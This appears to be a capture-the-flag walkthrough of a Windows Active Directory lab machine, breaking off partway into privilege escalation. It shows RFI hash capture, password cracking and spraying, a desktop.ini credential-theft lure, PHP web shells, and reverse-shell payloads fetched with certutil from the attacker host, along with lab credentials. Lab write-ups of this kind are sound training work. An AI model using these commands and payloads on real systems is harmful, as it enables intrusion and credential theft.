## 0. Initial Enumeration

### 0.1. Port Scan

```console
root@kali:~# nmap -A --max-scan-delay 0 10.10.11.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 14:41 +08
Nmap scan report for 10.10.11.187
Host is up (0.0059s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-02 13:41:36Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-02-02T13:41:44
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   5.75 ms 10.10.14.1
2   6.14 ms 10.10.11.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.67 seconds
```

## 1. Targetting the web service

### 1.1. Scanning for subdomains

The index page doesn't have anything useful, let's see if it has pages under other subdomains

![image](https://github.com/user-attachments/assets/b939e469-a970-40ef-ae5e-f5d9b805b184)

#### gobuster

```console
root@kali:~# gobuster vhost -u flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://flight.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/02/03 08:00:22 Starting gobuster in VHOST enumeration mode
===============================================================
Found: school.flight.htb Status: 200 [Size: 3996]
Progress: 4989 / 4990 (99.98%)===============================================================
2023/02/03 08:00:26 Finished
===============================================================
```

#### wfuzz

```console
root@kali:~# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

### 1.2. Scanning for file inclusion

`school.htb.flight` returns another page:

![image](https://github.com/user-attachments/assets/2e914107-1045-4bdd-a059-bb0d824afd94)

A quick parse of links on the reviews that it may be susceptible to file inclusions with `/index.php?view=<FILE>`

```console
root@kali:~# curl http://school.flight.htb/ | grep href
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3996  100  3996    0     0   313k      0 --:--:-- --:--:-- --:--:--  325k
<link rel="stylesheet" type="text/css" href="styles/style.css" />
<!--[if IE 6]><link rel="stylesheet" type="text/css" href="styles/ie6.css" /><![endif]-->
      <div><a href="index.html"><img src="images/logo.gif" alt="" /></a></div>
      <li><a href="index.php?view=home.html">Home</a></li>
      <li><a href="index.php?view=about.html">About Us</a></li>
      <li><a href="index.php?view=blog.html">Blog</a></li>
            <a href="#"><img src="images/model1.jpg" alt="" /></a>
              <h2><a href="#">Our <span class="last">Curabitur dictum</span></a></h2>
              <h2><a href="#">Nam a mauris <span class="last">Pellentesque</span></a></h2>
                <h2><a href="#">This is just a place holder.</a></h2>
                <h2><a href="#">This is just a place holder.</a></h2>
                <h2><a href="#">This is just a place holder.</a></h2>
      <div id="connect"> <a href="#"><img src="images/icon-facebook.gif" alt="" /></a> <a href="#"><img src="images/icon-twitter.gif" alt="" /></a> <a href="#"><img src="images/icon-youtube.gif" alt="" /></a> </div>
        <p>Copyright &copy; <a href="#">Domain Name</a> - All Rights Reserved | Template By <a href="#">Domain Name</a></p>
```

<details><summary>Fuzzing can also reveal the <code>view</code> parameter</summary>

```console
root@kali:~# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://school.flight.htb/index.php?FUZZ=index.php" --hh 3996
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://school.flight.htb/index.php?FUZZ=index.php
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000004393:   200        91 L     249 W      3194 Ch     "view"

Total time: 0
Processed Requests: 4713
Filtered Requests: 4712
Requests/sec.: 0
```

</details>

Attempting to read local files failed, let's try remote file

![image](https://github.com/user-attachments/assets/fddc836a-35e2-47c7-ab00-6362f94b22b8)

Setup SMB server using impacket:

```console
root@kali:~# impacket-smbserver evil . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Browse to the RFI on target: `curl http://school.flight.htb/index.php?view=//10.10.14.35/evi`

We got a password hash from the response:

```console
[*] Incoming connection (10.10.11.187,52594)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:1d63e156250c091d554c38e61898a617:0101000000000000000cfad26437d9014d9245703c18a36200000000010010007a004f0068005a00470053006c005900030010007a004f0068005a00470053006c00590002001000440048005200770061006b007a00620004001000440048005200770061006b007a00620007000800000cfad26437d9010600040002000000080030003000000000000000000000000030000058df347d6b818cdc1c2d981a7ca8662e1de7e64d05f4fb5c0b1d53fef5db45f90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330035000000000000000000
[*] Closing down connection (10.10.11.187,52594)
[*] Remaining connections []
```

<details><summary>Crack the password hash with hashcat revealed that the password for <code>svc_apache</code> is <code>S@Ss!K@*t13</code></summary>

```console
root@kali:~# hashcat svc_apache.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 1440/2945 MB (512 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

SVC_APACHE::flight:aaaaaaaaaaaaaaaa:1d63e156250c091d554c38e61898a617:0101000000000000000cfad26437d9014d9245703c18a36200000000010010007a004f0068005a00470053006c005900030010007a004f0068005a00470053006c00590002001000440048005200770061006b007a00620004001000440048005200770061006b007a00620007000800000cfad26437d9010600040002000000080030003000000000000000000000000030000058df347d6b818cdc1c2d981a7ca8662e1de7e64d05f4fb5c0b1d53fef5db45f90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330035000000000000000000:S@Ss!K@*t13

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC_APACHE::flight:aaaaaaaaaaaaaaaa:1d63e156250c091...000000
Time.Started.....: Fri Feb  3 08:23:32 2023 (5 secs)
Time.Estimated...: Fri Feb  3 08:23:37 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2497.8 kH/s (0.45ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10663936/14344385 (74.34%)
Rejected.........: 0/10663936 (0.00%)
Restore.Point....: 10661888/14344385 (74.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: SAESH21 -> S4L1n45

Started: Fri Feb  3 08:23:04 2023
Stopped: Fri Feb  3 08:23:39 2023
```

</details>

## 2. Users and credentials enumerations

### 2.1. Verify permissions for `svc_apache`

Verifying credentials for `svc_apache` and checking its shares access

```console
root@kali:~# crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share
SMB         10.10.11.187    445    G0               Shared          READ
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share
SMB         10.10.11.187    445    G0               Users           READ
SMB         10.10.11.187    445    G0               Web             READ
```

### 2.2. Enumerate domain users

```console
root@kali:~# crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)
SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: H
SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: S
SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: S
SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: P
SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: N
SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: P
SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: S
SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: S
SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: P
SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: S
SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: H
SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: J
SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: K
SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: B
SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: B
```

### 2.3. Checking for password reuse

Put the list of users found into `users.txt` and test if anyone uses the same password

```console
root@kali:~# crackmapexec smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

User `S.Moon` uses the same password

### 2.4. Verify permissions for `S.Moon`

Verifying credentials for `S.Moon` and checking its shares access

```console
root@kali:~# crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share
SMB         10.10.11.187    445    G0               Shared          READ,WRITE
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share
SMB         10.10.11.187    445    G0               Users           READ
SMB         10.10.11.187    445    G0               Web             READ
```

#### 2.4.1. Attempting to get a shell (fail)

Attempting to get a shell fails despite having a writable share, likely due to some protection or permissions

```console
root@kali:~# impacket-psexec flight.htb/s.moon:'S@Ss!K@*t13'@10.10.11.187
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.187.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[*] Found writable share Shared
[*] Uploading file uOqfoXWC.exe
[-] Error uploading file uOqfoXWC.exe, aborting.....
[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

### 2.5. Attempt to find more credentials

Although the attempt to get a shell fail, we managed to get access to the `Shared` share, let's put a payload here and see if we can catch anything

Using the `desktop.ini` method to try stealing credentials, ref: <https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini>

Prepare `desktop.ini` file:

```
[.ShellClassInfo]
IconResource=\\10.10.14.35\evil\
```

Copy `desktop.ini` to `Shared` share:

```console
root@kali:~# smbclient -U S.Moon%'S@Ss!K@*t13' //10.10.11.187/Shared
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Feb  3 19:11:32 2023
  ..                                  D        0  Fri Feb  3 19:11:32 2023

                5056511 blocks of size 4096. 1182509 blocks available
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (2.8 kb/s) (average 2.8 kb/s)
```

Setup SMB server using impacket and wait for connection:

```console
root@kali:~# impacket-smbserver evil . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,53339)
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:cc7cf726a38777257c9193adf227b984:010100000000000080e9a7e18b37d901e381cbaff62937db0000000001001000520046005300560057004900490053000300100052004600530056005700490049005300020010004b0074004a0044004c006a0059007400040010004b0074004a0044004c006a00590074000700080080e9a7e18b37d9010600040002000000080030003000000000000000000000000030000058df347d6b818cdc1c2d981a7ca8662e1de7e64d05f4fb5c0b1d53fef5db45f90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330035000000000000000000
[*] Closing down connection (10.10.11.187,53339)
[*] Remaining connections []
```

<details><summary>Crack the password hash with hashcat revealed that the password for <code>c.bum</code> is <code>Tikkycoll_431012284</code></summary>

```console
root@kali:~# hashcat c.bum.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 1440/2945 MB (512 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

C.BUM::flight.htb:aaaaaaaaaaaaaaaa:cc7cf726a38777257c9193adf227b984:010100000000000080e9a7e18b37d901e381cbaff62937db0000000001001000520046005300560057004900490053000300100052004600530056005700490049005300020010004b0074004a0044004c006a0059007400040010004b0074004a0044004c006a00590074000700080080e9a7e18b37d9010600040002000000080030003000000000000000000000000030000058df347d6b818cdc1c2d981a7ca8662e1de7e64d05f4fb5c0b1d53fef5db45f90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330035000000000000000000:Tikkycoll_431012284

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: C.BUM::flight.htb:aaaaaaaaaaaaaaaa:cc7cf726a3877725...000000
Time.Started.....: Fri Feb  3 12:59:34 2023 (4 secs)
Time.Estimated...: Fri Feb  3 12:59:38 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2759.4 kH/s (0.42ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10536960/14344385 (73.46%)
Rejected.........: 0/10536960 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tioncurtis23 -> TiffanyCamila

Started: Fri Feb  3 12:59:33 2023
Stopped: Fri Feb  3 12:59:39 2023
```

</details>

#### 2.5.1. Attempting to get a shell (fail)

Attempting to get a shell fails despite having a writable share, likely due to some protection or permissions

```console
root@kali:~# impacket-psexec flight.htb/c.bum:Tikkycoll_431012284@10.10.11.187
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.187.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[*] Found writable share Shared
[*] Uploading file MGvgkcAH.exe
[-] Error uploading file MGvgkcAH.exe, aborting.....
[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

## 3. Getting a shell (finally)

The user `c.bum` has write access to one more share `web`

```console
root@kali:~# crackmapexec smb 10.10.11.187 -u c.bum -p Tikkycoll_431012284 --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share
SMB         10.10.11.187    445    G0               Shared          READ,WRITE
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share
SMB         10.10.11.187    445    G0               Users           READ
SMB         10.10.11.187    445    G0               Web             READ,WRITE
```

This directory appears to be the web root

```console
root@kali:~# smbclient -U c.bum%Tikkycoll_431012284 //10.10.11.187/Web
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Feb  3 20:07:01 2023
  ..                                  D        0  Fri Feb  3 20:07:01 2023
  flight.htb                          D        0  Fri Feb  3 20:07:01 2023
  school.flight.htb                   D        0  Fri Feb  3 20:07:01 2023

                5056511 blocks of size 4096. 1182275 blocks available
```

We can upload some php file to try get the web server to execute commands

### 3.1. PHP reverse shell

Let's generate a `reverse.php` file that will connect a reverse shell to Kali: `<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.35/4444 0>&1'"); ?>`

Upload `reverse.php` to `Web`:

```console
smb: \> cd flight.htb
smb: \flight.htb\> put reverse.php
putting file reverse.php as \flight.htb\reverse.php (3.6 kb/s) (average 3.7 kb/s)
```

Start a listerner on Kali: `rlwrap nc -nlvp 4444`

Browse to `http://flight.htb/reverse.php`

However, this doesn't work =/

### 3.2. PHP web shell

Let's start basic with a web shell first, generate a `webshell.php`: `<?php system($_GET['cmd']);?>`

Upload `webshell.php` to `Web`:

```console
smb: \flight.htb\> put webshell.php
putting file webshell.php as \flight.htb\webshell.php (1.5 kb/s) (average 2.9 kb/s)
```

Check webshell:

```console
root@kali:~# curl http://flight.htb/webshell.php?cmd=whoami
flight\svc_apache
```

Generate reverse shell PE: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.35 LPORT=4444 -f exe -o /var/www/html/reverse.exe`

Start a listerner on Kali: `rlwrap nc -nlvp 4444`

Getting the target to download and run the reverse shell:

☝️ The command we want to run is `certutil.exe /urlcache /f /split http://10.10.14.35/reverse.exe && .\reverse.exe`, but since we are running it from URL, we need to URL encode the command

```console
curl http://flight.htb/webshell.php?cmd=certutil.exe%20%2Furlcache%20%2Ff%20%2Fsplit%20http%3A%2F%2F10.10.14.35%2Freverse.exe%20%26%26%20.%5Creverse.exe
```

Verify shell hooked:

```cmd
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.187] 53440
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\flight.htb>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

C:\xampp\htdocs\flight.htb>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse chcecking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### 3.3. Getting user flag

We have the cred of `c.bum`, we can switch user with [RunasCS](https://github.com/antonioCoco/RunasCs)

Start a listerner on Kali: `rlwrap nc -nlvp 4444`

Execute:

```cmd
C:\xampp\htdocs\flight.htb>.\RunasCs.exe c.bum Tikkycoll_431012284 cmd -r 10.10.14.35:4445
.\RunasCs.exe c.bum Tikkycoll_431012284 cmd -r 10.10.14.35:4445
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-587b2$\Default
[+] Async process 'cmd' with pid 3416 created and left in background.
```

Verify shell hooked and get flag:

```cmd
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.187] 49726
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
flight\c.bum

C:\Windows\system32>type C:\Users\C.Bum\Desktop\user.txt
type C:\Users\C.Bum\Desktop\user.txt
44615e2908d1cbc02353cd411880ac6b
```

## 4. Privilege Escalation

A service is found on `8000`

```cmd
C:\Windows\system32>netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4596
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4596
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
⋮
```

Setup Chisel static remote port forwarding

```cmd
C:\Windows\system32>cd C:\Users\c.bum
cd C:\Users\c.bum

C:\Users\C.Bum>certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe
certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe
****  Online  ****
  000000  ...
  846600
CertUtil: -URLCache command completed successfully.

